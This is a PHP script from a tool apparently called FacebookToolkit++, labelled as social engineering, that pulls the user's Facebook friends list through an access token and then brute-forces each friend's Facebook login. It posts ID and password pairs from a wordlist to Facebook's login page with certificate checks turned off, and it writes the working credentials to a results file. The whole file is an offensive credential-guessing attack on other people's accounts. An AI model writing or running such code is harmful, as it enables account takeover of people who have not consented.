<?php

/**
 * @category  Social_Engineering
 * @package   FacebookToolkit++
 * @author    Wahyu Arif Purnomo <hi@warifp.co>
 * @copyright 2019 WARIFP
 * @license   MIT License <https://opensource.org/licenses/MIT>
 * @version   1.7
 * @link      https://github.com/warifp/FacebookToolkit
 * @since     15 June 2019
 */

require_once "vendor/autoload.php";

use PHPHtmlParser\Dom;

$input = $climate->br()->input('Wordlist?');
$list_password = $input->prompt();

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url_based . "/v3.2/me/friends/?fields=name,email&access_token=" . $token . "&limit=5000");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$wahyuarifpurnomo = curl_exec($curl);
curl_close($curl);

$decode = json_decode($wahyuarifpurnomo);

$climate->br()->info('Required retrieve ID');
sleep(3);
$climate->br()->info('Starting retrieve ID..');
echo "\n";
progress($progress);

$no = 0;
foreach ($decode->data as $hasil) {
    $no++;
    $colorstring = getName($n);
    if (!empty($hasil->id)) {
        echo $no . "." . $colors->getColoredString(" $hasil->name | $hasil->id", $warifp[$colorstring]) . "\n";
        $save = fopen('tmp/id.log', 'a');
        fwrite($save, $hasil->id . "\n");
        fclose($save);
    }
}

$list_id = "tmp/id.log" or die("File ID not found!");
$climate->br()->info('Retrieve ID success');
sleep(3);
$climate->br()->info('Starting brute force your friends by ID..');
echo "\n";
progress($progress);

// 

$no = 0;
function brute($username, $password, $no, $url_brute)
{

    $dom = new Dom;

    $save_dir_live = "result/bruteforce-live.txt";
    $save_dir_die = "result/bruteforce-die.txt";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url_brute . "/login.php?login_attempt=1");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$username}&pass={$password}");
    curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
    $login = curl_exec($ch);

    $dom->loadStr($login, []);
    $contents = $dom->find('title');

    if ($contents == "<title>Masuk Facebook | Facebook</title>") {
        echo $no . ". \e[0;31mDIE\e[0m  | $username | $password\n";
        $save = fopen($save_dir_die, 'a');
        fwrite($save, $username . "|" . $password . "\n");
        fclose($save);
    } else if ($contents == "<title>Coba lagi nanti</title>") {
        echo $no . ". \e[0;31mDIE\e[0m  | $username | $password\n";
        $save = fopen($save_dir_die, 'a');
        fwrite($save, $username . "|" . $password . "\n");
        fclose($save);
    } else {
        echo $no . ". \e[0;33mLIVE\e[0m | $username | $password\n";
        $save = fopen($save_dir_live, 'a');
        fwrite($save, $username . "|" . $password . "\n");
        fclose($save);
    }
}

$file = file_get_contents("$list_id");
$username = explode("\n", str_replace("\r", "", $file));

$file = file_get_contents("$list_password");
$password = explode("\n", str_replace("\r", "", $file));

foreach ($username as $users) {
    $users = @trim($users);
    foreach ($password as $pass) {
        $no++;
        $pass = @trim($pass);
        echo brute($users, $pass, $no, $url_brute);
    }
}
// 

$save_dir_live = "result/bruteforce-live.txt";
$save_dir_die = "result/bruteforce-die.txt";

$climate->br()->shout('Done, your result saved in folder "' . $save_dir_live . '" and "' . $save_dir_die . '".');
$climate->br()->info('Cleaning log..');
echo "\n";
progress($progress);
$delete = "tmp/id.log";
unlink($delete) or die("\e[1;31mCouldn't delete file, file not found\e[0m");
sleep(3);
$climate->br()->info('Done cleaning log.');
